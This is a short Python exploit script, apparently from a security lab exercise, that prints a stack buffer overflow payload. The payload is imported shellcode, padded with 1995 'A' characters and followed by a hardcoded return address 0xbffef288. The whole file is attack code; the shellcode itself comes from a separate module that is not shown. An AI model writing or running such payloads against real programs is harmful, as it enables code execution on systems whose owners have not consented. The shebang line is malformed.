#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

#print("A"*2052)
addr = pack("<I", 0xbffef288)
print(shellcode + "A"*1995 + addr)
